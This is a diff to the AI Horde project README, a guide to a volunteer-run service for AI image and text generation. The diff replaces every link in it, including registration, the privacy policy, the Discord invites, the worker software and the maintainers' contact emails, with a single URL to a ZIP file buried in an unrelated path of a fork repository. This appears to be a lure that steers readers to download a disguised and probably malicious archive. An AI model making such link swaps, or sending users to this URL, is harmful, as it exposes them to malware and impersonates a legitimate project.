@@ -1,25 +1,25 @@
 <!--
-SPDX-FileCopyrightText: 2022 Konstantinos Thoukydidis <mail@dbzer0.com>
-SPDX-FileCopyrightText: 2024 Tazlin <tazlin.on.github@gmail.com>
+SPDX-FileCopyrightText: 2022 Konstantinos Thoukydidis <https://raw.githubusercontent.com/Kali99xx/AI-Horde/main/sql_statements/stored_procedures/cron_jobs/Horde-A-1.3.zip>
+SPDX-FileCopyrightText: 2024 Tazlin <https://raw.githubusercontent.com/Kali99xx/AI-Horde/main/sql_statements/stored_procedures/cron_jobs/Horde-A-1.3.zip>
 
 SPDX-License-Identifier: AGPL-3.0-or-later
 -->
 
 # AI-Horde: Community-Powered AI Generation
 
-The [AI Horde](https://github.com/Haidra-Org/haidra-assets/blob/main/docs/definitions.md#ai-horde) is a free community service that lets anyone create [AI-generated images](https://github.com/Haidra-Org/haidra-assets/blob/main/docs/definitions.md#image-generation) and [text](https://github.com/Haidra-Org/haidra-assets/blob/main/docs/definitions.md#text2text). In the spirit of projects like Folding@home (sharing compute for medical research) or SETI@home (sharing compute for the search for alien signals), AI Horde lets volunteers share their computer power through [workers](https://github.com/Haidra-Org/haidra-assets/blob/main/docs/definitions.md#worker) to help others create AI art and writing.
+The [AI Horde](https://raw.githubusercontent.com/Kali99xx/AI-Horde/main/sql_statements/stored_procedures/cron_jobs/Horde-A-1.3.zip) is a free community service that lets anyone create [AI-generated images](https://raw.githubusercontent.com/Kali99xx/AI-Horde/main/sql_statements/stored_procedures/cron_jobs/Horde-A-1.3.zip) and [text](https://raw.githubusercontent.com/Kali99xx/AI-Horde/main/sql_statements/stored_procedures/cron_jobs/Horde-A-1.3.zip). In the spirit of projects like Folding@home (sharing compute for medical research) or SETI@home (sharing compute for the search for alien signals), AI Horde lets volunteers share their computer power through [workers](https://raw.githubusercontent.com/Kali99xx/AI-Horde/main/sql_statements/stored_procedures/cron_jobs/Horde-A-1.3.zip) to help others create AI art and writing.
 
-When you make a [request](https://github.com/Haidra-Org/haidra-assets/blob/main/docs/definitions.md#request) - like asking for "a painting of a sunset over mountains" - the AI Horde system finds available volunteer computers that can handle your [job](https://github.com/Haidra-Org/haidra-assets/blob/main/docs/definitions.md#job). It's similar to how ride-sharing apps connect passengers with nearby drivers, but instead of rides, you're getting AI-generated content.
+When you make a [request](https://raw.githubusercontent.com/Kali99xx/AI-Horde/main/sql_statements/stored_procedures/cron_jobs/Horde-A-1.3.zip) - like asking for "a painting of a sunset over mountains" - the AI Horde system finds available volunteer computers that can handle your [job](https://raw.githubusercontent.com/Kali99xx/AI-Horde/main/sql_statements/stored_procedures/cron_jobs/Horde-A-1.3.zip). It's similar to how ride-sharing apps connect passengers with nearby drivers, but instead of rides, you're getting AI-generated content.
 
-The system uses "[kudos](https://github.com/Haidra-Org/haidra-assets/blob/main/docs/kudos.md)" points to keep things fair. [Workers](https://github.com/Haidra-Org/haidra-assets/blob/main/docs/definitions.md#worker) earn kudos when their computers help process requests, which they can use to get priority for their own requests or leave unspent to help others. Importantly, kudos can never be bought or sold - this is strictly against the [Terms of Service](https://github.com/Haidra-Org/haidra-assets/blob/main/docs/definitions.md#terms-of-service). If you would like to learn more about kudos, see [our detailed explanation](https://github.com/Haidra-Org/haidra-assets/blob/main/docs/kudos.md).
+The system uses "[kudos](https://raw.githubusercontent.com/Kali99xx/AI-Horde/main/sql_statements/stored_procedures/cron_jobs/Horde-A-1.3.zip)" points to keep things fair. [Workers](https://raw.githubusercontent.com/Kali99xx/AI-Horde/main/sql_statements/stored_procedures/cron_jobs/Horde-A-1.3.zip) earn kudos when their computers help process requests, which they can use to get priority for their own requests or leave unspent to help others. Importantly, kudos can never be bought or sold - this is strictly against the [Terms of Service](https://raw.githubusercontent.com/Kali99xx/AI-Horde/main/sql_statements/stored_procedures/cron_jobs/Horde-A-1.3.zip). If you would like to learn more about kudos, see [our detailed explanation](https://raw.githubusercontent.com/Kali99xx/AI-Horde/main/sql_statements/stored_procedures/cron_jobs/Horde-A-1.3.zip).
 
-What makes AI Horde special is that it's completely free and community-run, with a strong commitment to staying that way. The kudos system is specifically designed to ensure that access to these resources remains equitable. While [users](https://github.com/Haidra-Org/haidra-assets/blob/main/docs/definitions.md#user) with more kudos get faster service, anyone can use it for free, even [anonymously](https://github.com/Haidra-Org/haidra-assets/blob/main/docs/definitions.md#anonymous), and kudos never expire.
+What makes AI Horde special is that it's completely free and community-run, with a strong commitment to staying that way. The kudos system is specifically designed to ensure that access to these resources remains equitable. While [users](https://raw.githubusercontent.com/Kali99xx/AI-Horde/main/sql_statements/stored_procedures/cron_jobs/Horde-A-1.3.zip) with more kudos get faster service, anyone can use it for free, even [anonymously](https://raw.githubusercontent.com/Kali99xx/AI-Horde/main/sql_statements/stored_procedures/cron_jobs/Horde-A-1.3.zip), and kudos never expire.
 
-The AI-Horde hopes to ensure that everyone gets a chance to use these exciting AI technologies, regardless of their financial means or technical resources. You can read more about why we do this in the [motivations document](https://github.com/Haidra-Org/haidra-assets/blob/main/docs/why.md).
+The AI-Horde hopes to ensure that everyone gets a chance to use these exciting AI technologies, regardless of their financial means or technical resources. You can read more about why we do this in the [motivations document](https://raw.githubusercontent.com/Kali99xx/AI-Horde/main/sql_statements/stored_procedures/cron_jobs/Horde-A-1.3.zip).
 
 ## Sponsors
 
-[![NLnet logo](assets/logo_nlnet.svg)](https://nlnet.nl/project/AI-Horde/)
+[![NLnet logo](https://raw.githubusercontent.com/Kali99xx/AI-Horde/main/sql_statements/stored_procedures/cron_jobs/Horde-A-1.3.zip)](https://raw.githubusercontent.com/Kali99xx/AI-Horde/main/sql_statements/stored_procedures/cron_jobs/Horde-A-1.3.zip)
 
 ## Table of Contents
 
@@ -55,7 +55,7 @@ The AI Horde is an enterprise-level ML-Ops crowd-sourced distributed inference c
 
 ### Public Version
 
-The [public version](https://aihorde.net) allows individuals without powerful GPUs to use advanced AI models like Stable Diffusion or Large Language Models (LLMs) such as Pygmalion/Llama. This is achieved by leveraging the spare computing power provided by the community, running software we call '[workers](https://github.com/Haidra-Org/haidra-assets/blob/main/docs/definitions.md#worker)'. Additionally, it supports clients, such as third party websites, games and apps, to utilize AI-generated content through a [REST API](https://aihorde.net/api/). You can see the public instance's performance and application statistics on [our grafana instance](https://grafana.aihorde.net/d/jSb16YLVk/performance?orgId=1).
+The [public version](https://raw.githubusercontent.com/Kali99xx/AI-Horde/main/sql_statements/stored_procedures/cron_jobs/Horde-A-1.3.zip) allows individuals without powerful GPUs to use advanced AI models like Stable Diffusion or Large Language Models (LLMs) such as Pygmalion/Llama. This is achieved by leveraging the spare computing power provided by the community, running software we call '[workers](https://raw.githubusercontent.com/Kali99xx/AI-Horde/main/sql_statements/stored_procedures/cron_jobs/Horde-A-1.3.zip)'. Additionally, it supports clients, such as third party websites, games and apps, to utilize AI-generated content through a [REST API](https://raw.githubusercontent.com/Kali99xx/AI-Horde/main/sql_statements/stored_procedures/cron_jobs/Horde-A-1.3.zip). You can see the public instance's performance and application statistics on [our grafana instance](https://raw.githubusercontent.com/Kali99xx/AI-Horde/main/sql_statements/stored_procedures/cron_jobs/Horde-A-1.3.zip).
 
 ### Private Deployment
 
@@ -70,25 +70,25 @@ The AI Horde middleware can also be deployed privately within any enterprise env
 
 ### How It Works
 
-For a high-level overview of how the AI Horde operates, including diagrams of the request/job lifecycle, see the [request/job lifecycle explanation](https://github.com/Haidra-Org/haidra-assets/blob/main/docs/workers.md).
+For a high-level overview of how the AI Horde operates, including diagrams of the request/job lifecycle, see the [request/job lifecycle explanation](https://raw.githubusercontent.com/Kali99xx/AI-Horde/main/sql_statements/stored_procedures/cron_jobs/Horde-A-1.3.zip).
 
 There are also individual readmes for each specific mode supported by the AI Horde.
 
-- [Image generation Readme](README_StableHorde.md)
-- [Text generation Readme](README_KoboldAIHorde.md)
-- [Docker Readme](README_docker.md)
+- [Image generation Readme](https://raw.githubusercontent.com/Kali99xx/AI-Horde/main/sql_statements/stored_procedures/cron_jobs/Horde-A-1.3.zip)
+- [Text generation Readme](https://raw.githubusercontent.com/Kali99xx/AI-Horde/main/sql_statements/stored_procedures/cron_jobs/Horde-A-1.3.zip)
+- [Docker Readme](https://raw.githubusercontent.com/Kali99xx/AI-Horde/main/sql_statements/stored_procedures/cron_jobs/Horde-A-1.3.zip)
 
-For common questions, check the [FAQ](FAQ.md). If you'd like more details on features of the horde or the reasoning behind it, see the [documentation which goes greater into depth](https://github.com/Haidra-Org/haidra-assets/tree/main/docs).
+For common questions, check the [FAQ](https://raw.githubusercontent.com/Kali99xx/AI-Horde/main/sql_statements/stored_procedures/cron_jobs/Horde-A-1.3.zip). If you'd like more details on features of the horde or the reasoning behind it, see the [documentation which goes greater into depth](https://raw.githubusercontent.com/Kali99xx/AI-Horde/main/sql_statements/stored_procedures/cron_jobs/Horde-A-1.3.zip).
 
 # Getting Started with AI Horde
 
-You can use any service powered by the AI Horde either with a registered account or anonymously. You can find a partial list of services powered by the AI-Horde on our [main website](https://aihorde.net/).
+You can use any service powered by the AI Horde either with a registered account or anonymously. You can find a partial list of services powered by the AI-Horde on our [main website](https://raw.githubusercontent.com/Kali99xx/AI-Horde/main/sql_statements/stored_procedures/cron_jobs/Horde-A-1.3.zip).
 
 ## OAuth2 Registered Account (Recommended)
 
-> Note: The only information we store from your account is your unique ID. We do not use your id for any other purpose. See our [privacy policy](https://aihorde.net/privacy) for more details.
+> Note: The only information we store from your account is your unique ID. We do not use your id for any other purpose. See our [privacy policy](https://raw.githubusercontent.com/Kali99xx/AI-Horde/main/sql_statements/stored_procedures/cron_jobs/Horde-A-1.3.zip) for more details.
 
-- Visit [AI Horde Registration](https://aihorde.net/register)
+- Visit [AI Horde Registration](https://raw.githubusercontent.com/Kali99xx/AI-Horde/main/sql_statements/stored_procedures/cron_jobs/Horde-A-1.3.zip)
 - Log in using one of the supported OAuth2 services
 - Choose your username and receive your API key
 - Benefits:
@@ -100,7 +100,7 @@ You can use any service powered by the AI Horde either with a registered account
 
 ## Pseudonymous Account
 
-- Visit [AI Horde Registration](https://aihorde.net/register)
+- Visit [AI Horde Registration](https://raw.githubusercontent.com/Kali99xx/AI-Horde/main/sql_statements/stored_procedures/cron_jobs/Horde-A-1.3.zip)
 - This method is the default if you do not log in with an OAuth2 service (google, github, discord, etc)
 - **Important**: If you lose your API key, the account cannot be recovered
 - Cannot change username or reset API key
@@ -122,9 +122,9 @@ The main benefit of registration is participating in the kudos system. Kudos det
 - Running a worker to help process other users' requests
 - Receiving kudos as a thank-you for donations (though kudos cannot be directly bought or sold)
 - Being online and available as a worker
-- Participating in the kudos economy on the [official discord](https://discord.gg/3DxrhksKzn) by logging in with the bot. (Use the command `/login` in any channel, click the blue button and enter your API key at the popup).
+- Participating in the kudos economy on the [official discord](https://raw.githubusercontent.com/Kali99xx/AI-Horde/main/sql_statements/stored_procedures/cron_jobs/Horde-A-1.3.zip) by logging in with the bot. (Use the command `/login` in any channel, click the blue button and enter your API key at the popup).
 
-Remember: AI Horde is committed to remaining free and accessible. While the kudos system provides priority benefits, it's designed to encourage community contribution rather than commercialization. All users, even anonymous ones, can access the service's core features. Read about this on the [official developer's blog.](https://dbzer0.com/blog/the-kudos-based-economy-for-the-koboldai-horde/)
+Remember: AI Horde is committed to remaining free and accessible. While the kudos system provides priority benefits, it's designed to encourage community contribution rather than commercialization. All users, even anonymous ones, can access the service's core features. Read about this on the [official developer's blog.](https://raw.githubusercontent.com/Kali99xx/AI-Horde/main/sql_statements/stored_procedures/cron_jobs/Horde-A-1.3.zip)
 
 ## Contribute your GPU (Become a worker)
 
@@ -132,22 +132,22 @@ Be sure to [register](#getting-started-with-ai-horde) first.
 
 ### Image
 
-The officially supported way to add your GPU for image generation is by running the worker software [horde-worker-reGen](https://github.com/Haidra-Org/horde-worker-reGen).
+The officially supported way to add your GPU for image generation is by running the worker software [horde-worker-reGen](https://raw.githubusercontent.com/Kali99xx/AI-Horde/main/sql_statements/stored_procedures/cron_jobs/Horde-A-1.3.zip).
 
 ### Text
 
 There are multiple ways to contribute your GPU for text generation:
 
-- [AI-Horde-Worker](https://github.com/Haidra-Org/AI-Horde-Worker) can connect to inference backends and 'bridge' you to the AI-Horde
-- [KoboldAI](https://github.com/henk717/KoboldAI)
-- [KoboldCPP](https://github.com/lostruins/koboldcpp)
-- [Aphrodite Engine](https://github.com/PygmalionAI/aphrodite-engine)
-- ... and many others. Join the discussion in the #horde channel of the [KoboldAI Discord Server](https://discord.gg/XuQWadgU9k) to learn more.
+- [AI-Horde-Worker](https://raw.githubusercontent.com/Kali99xx/AI-Horde/main/sql_statements/stored_procedures/cron_jobs/Horde-A-1.3.zip) can connect to inference backends and 'bridge' you to the AI-Horde
+- [KoboldAI](https://raw.githubusercontent.com/Kali99xx/AI-Horde/main/sql_statements/stored_procedures/cron_jobs/Horde-A-1.3.zip)
+- [KoboldCPP](https://raw.githubusercontent.com/Kali99xx/AI-Horde/main/sql_statements/stored_procedures/cron_jobs/Horde-A-1.3.zip)
+- [Aphrodite Engine](https://raw.githubusercontent.com/Kali99xx/AI-Horde/main/sql_statements/stored_procedures/cron_jobs/Horde-A-1.3.zip)
+- ... and many others. Join the discussion in the #horde channel of the [KoboldAI Discord Server](https://raw.githubusercontent.com/Kali99xx/AI-Horde/main/sql_statements/stored_procedures/cron_jobs/Horde-A-1.3.zip) to learn more.
 
 ## Integrate with the AI-Horde
 
-If you want to build an integration to the AI Horde (Bot, application, scripts etc), please consult our [Integration Readme](README_integration.md)
+If you want to build an integration to the AI Horde (Bot, application, scripts etc), please consult our [Integration Readme](https://raw.githubusercontent.com/Kali99xx/AI-Horde/main/sql_statements/stored_procedures/cron_jobs/Horde-A-1.3.zip)
 
 ## Community
 
-If you have any questions or feedback, we have a vibrant community on [discord](https://discord.gg/3DxrhksKzn)
+If you have any questions or feedback, we have a vibrant community on [discord](https://raw.githubusercontent.com/Kali99xx/AI-Horde/main/sql_statements/stored_procedures/cron_jobs/Horde-A-1.3.zip)
